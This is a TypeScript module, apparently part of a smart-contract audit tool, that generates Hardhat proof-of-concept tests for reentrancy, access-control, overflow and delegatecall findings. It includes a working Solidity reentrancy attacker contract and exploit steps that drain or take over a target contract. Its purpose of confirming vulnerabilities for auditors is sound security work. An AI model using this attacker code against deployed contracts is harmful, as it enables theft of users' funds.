/**
 * Hardhat test script template for PoC generation
 */

import { Finding } from '../../types';
import { generateExploitStrategy } from '../generator';

/**
 * Generate Hardhat-compatible PoC script
 */
export function generateHardhatPoc(finding: Finding): string {
  const strategy = generateExploitStrategy(finding);
  const contractName = finding.contract;
  const ruleId = finding.rule_id;

  return `
${generateSafetyHeader()}

/**
 * PROOF OF CONCEPT: ${finding.title}
 *
 * Rule ID: ${ruleId}
 * Severity: ${finding.severity.toUpperCase()}
 * Contract: ${contractName}
 * Location: ${finding.files[0]?.path || 'Unknown'}:${finding.files[0]?.line_start || 0}
 *
 * Impact: ${finding.impact}
 * Confidence: ${finding.confidence}
 *
 * Description:
 * ${finding.description}
 *
 * Recommendation:
 * ${finding.recommendation}
 */

${strategy}

const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("${ruleId}: ${finding.title}", function () {
  let contract;
  let attacker;
  let victim;
  let owner;

  beforeEach(async function () {
    // Get signers
    [owner, victim, attacker] = await ethers.getSigners();

    // Deploy the vulnerable contract
    const ContractFactory = await ethers.getContractFactory("${contractName}");
    contract = await ContractFactory.deploy();
    await contract.deployed();

    console.log("Contract deployed at:", contract.address);
    console.log("Attacker address:", attacker.address);
  });

${generateTestCase(finding)}

  after(function () {
    console.log("\\n" + "=".repeat(60));
    console.log("⚠️  REMINDER: This PoC was executed in a SIMULATED environment");
    console.log("⚠️  NO actual funds were transferred or at risk");
    console.log("=".repeat(60));
  });
});

${generateAttackerContract(finding)}
`;
}

/**
 * Generate safety header
 */
function generateSafetyHeader(): string {
  return `///////////////////////////// SAFETY NOTICE /////////////////////////////
//
// ⚠️  This is a SIMULATED exploit for security research purposes only
// ⚠️  All transactions are executed on a LOCAL FORK or TEST NETWORK
// ⚠️  NO funds are transferred on mainnet
// ⚠️  This PoC demonstrates the vulnerability without causing harm
//
// Usage:
//   npx hardhat test <this-file> --network hardhat
//
// Requirements:
//   - Hardhat environment configured
//   - Contract source code available
//   - All dependencies installed
//
//////////////////////////////////////////////////////////////////////////
`;
}

/**
 * Generate test case based on vulnerability type
 */
function generateTestCase(finding: Finding): string {
  const category = finding.tags?.[0] || '';

  switch (category) {
    case 'reentrancy':
      return generateReentrancyTest(finding);

    case 'access-control':
      return generateAccessControlTest(finding);

    case 'integer-overflow':
      return generateOverflowTest(finding);

    case 'delegatecall':
      return generateDelegatecallTest(finding);

    default:
      return generateGenericTest(finding);
  }
}

function generateReentrancyTest(finding: Finding): string {
  return `
  it("should demonstrate reentrancy vulnerability", async function () {
    // Step 1: Setup - victim deposits funds
    await contract.connect(victim).deposit({ value: ethers.utils.parseEther("10") });
    console.log("Victim deposited 10 ETH");

    const victimBalance = await contract.balances(victim.address);
    console.log("Victim contract balance:", ethers.utils.formatEther(victimBalance));

    // Step 2: Deploy attacker contract
    const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await AttackerFactory.connect(attacker).deploy(contract.address);
    await attackerContract.deployed();

    // Step 3: Attacker deposits small amount
    await attackerContract.connect(attacker).attack({ value: ethers.utils.parseEther("1") });
    console.log("Attacker deposited 1 ETH and triggered attack");

    // Step 4: Verify exploitation
    const attackerProfit = await ethers.provider.getBalance(attackerContract.address);
    console.log("Attacker contract balance:", ethers.utils.formatEther(attackerProfit));

    // Attacker should have more than initially deposited
    expect(attackerProfit).to.be.gt(ethers.utils.parseEther("1"));
    console.log("✓ Reentrancy vulnerability confirmed!");
  });
`;
}

function generateAccessControlTest(finding: Finding): string {
  return `
  it("should demonstrate missing access control", async function () {
    // Step 1: Check initial state
    const initialBalance = await ethers.provider.getBalance(contract.address);
    console.log("Contract balance:", ethers.utils.formatEther(initialBalance));

    // Step 2: Attacker calls privileged function without authorization
    const tx = await contract.connect(attacker).emergencyWithdraw();
    await tx.wait();
    console.log("Attacker called emergencyWithdraw() without authorization");

    // Step 3: Verify exploitation
    const finalBalance = await ethers.provider.getBalance(contract.address);
    console.log("Contract balance after:", ethers.utils.formatEther(finalBalance));

    expect(finalBalance).to.equal(0);
    console.log("✓ Access control bypass confirmed!");
  });
`;
}

function generateOverflowTest(finding: Finding): string {
  return `
  it("should demonstrate integer overflow", async function () {
    // Step 1: Setup initial balance
    await contract.connect(victim).deposit({ value: ethers.utils.parseEther("10") });

    const initialBalance = await contract.balances(victim.address);
    console.log("Initial balance:", ethers.utils.formatEther(initialBalance));

    // Step 2: Trigger overflow with large rate
    const largeRate = ethers.BigNumber.from("2").pow(200);
    await contract.addInterest(victim.address, largeRate);

    // Step 3: Verify overflow occurred
    const finalBalance = await contract.balances(victim.address);
    console.log("Balance after overflow:", ethers.utils.formatEther(finalBalance));

    // Balance should have wrapped around
    expect(finalBalance).to.be.lt(initialBalance);
    console.log("✓ Integer overflow confirmed!");
  });
`;
}

function generateDelegatecallTest(finding: Finding): string {
  return `
  it("should demonstrate delegatecall vulnerability", async function () {
    // Step 1: Deploy malicious implementation
    const MaliciousFactory = await ethers.getContractFactory("MaliciousImplementation");
    const malicious = await MaliciousFactory.connect(attacker).deploy();
    await malicious.deployed();

    console.log("Malicious contract deployed at:", malicious.address);

    // Step 2: Upgrade to malicious implementation
    await contract.connect(attacker).upgradeImplementation(malicious.address);
    console.log("Upgraded to malicious implementation");

    // Step 3: Execute malicious code via delegatecall
    const data = malicious.interface.encodeFunctionData("pwn");
    await contract.connect(attacker).executeUpgrade(data);

    console.log("✓ Delegatecall vulnerability confirmed!");
  });
`;
}

function generateGenericTest(finding: Finding): string {
  return `
  it("should demonstrate ${finding.title}", async function () {
    // TODO: Implement specific test for this vulnerability
    // Vulnerability details:
    // - ${finding.description}
    // - Location: ${finding.files[0]?.path || 'Unknown'}:${finding.files[0]?.line_start || 0}
    //
    // Recommended fix:
    // ${finding.recommendation}

    console.log("⚠️  Generic test template - customize for specific vulnerability");
  });
`;
}

/**
 * Generate attacker contract code if needed
 */
function generateAttackerContract(finding: Finding): string {
  const category = finding.tags?.[0] || '';

  if (category === 'reentrancy') {
    return `
// Attacker contract for reentrancy demonstration
// Save this as a separate .sol file in contracts/ directory
/*
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVulnerable public vulnerable;
    uint256 public attackAmount = 1 ether;

    constructor(address _vulnerable) {
        vulnerable = IVulnerable(_vulnerable);
    }

    function attack() external payable {
        require(msg.value >= attackAmount, "Need at least 1 ETH");
        vulnerable.deposit{value: attackAmount}();
        vulnerable.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(vulnerable).balance >= attackAmount) {
            vulnerable.withdraw(attackAmount);
        }
    }
}
*/
`;
  }

  return '';
}
